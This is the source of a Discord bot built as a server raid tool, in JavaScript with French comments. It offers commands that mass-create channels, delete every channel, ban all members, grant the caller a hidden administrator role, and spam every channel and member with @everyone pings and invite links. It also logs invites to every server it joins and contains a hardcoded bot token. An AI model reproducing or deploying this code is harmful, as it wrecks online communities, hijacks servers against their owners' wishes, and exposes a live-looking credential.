const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "process.env.TOKEN";
var prefix = ".";
var mention = "126connectés"

var fucked = false;
 
bot.on('ready', function() {
  setInterval(async () => {
const statuslist = [
  `Kazuo'My'Owner`,
  `Kazuo'The'King`,
];
const random = Math.floor(Math.random() * statuslist.length);

try {
  await bot.user.setPresence({
    game: {
      name: `${statuslist[random]}`,
      url : "https://www.twitch.tv/gotaga",
      url : 'https://www.twitch.tv/michou',
    },
    status: "online"
  });
} catch (error) {
  console.error(error);
}
}, 3000);
    // invitation lien
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('message', msg => {
  //#regions
  /* Commandes */
  if (msg.content === '.ping') {
    msg.reply('POOONNGG');
    if (msg.channel.type === "POOONNGG") return;
    if (msg.deletable) msg.delete();
  }
  //#fin de l action
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.z') {
    console.log(`Commande .raud par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("Error credentials must be provided by my social engineering..");
     }, 500);
  }
            if (msg.content === '.mp') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "mp") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send("https://discord.gg/UDS3kXk Rejoins-nous, nous sommes actuellement très nombreux fait toi des amis parmis nous :)").catch(error => {}) }, 10000)})
       }

if(msg.content === '.suppr'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === '.raid') {
    console.log(`Commande .raid par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setName('Kazuo.King.Of.This.Server').catch(e => {});
 
      for (var i = 0; i < 1000; i++) {
        msg.guild.createChannel('ERR0R', 'voice').catch(e => {});
        msg.guild.createChannel('ERR0R', 'text').catch(e => {});
      }
      fucked = true;
            }

    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .ban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "  ") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.admin') {
    console.log(`Commande .be par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "  ",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.on("message", msg => {
        if(msg.content.startsWith(".raid")){ 
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone You must be raid by Kazuo my emperor https://i.pinimg.com/originals/4f/59/cc/4f59cc5cf914bc6e595b1149be2ff6c4.gif')
              }, 2500);
            });
          }
        });

bot.login("NTgzMzIxNTU5Njc5MzY5MjE2.XPKK7w.Qweh8bUf2Q3RY5a6YRfcfzWw7_U")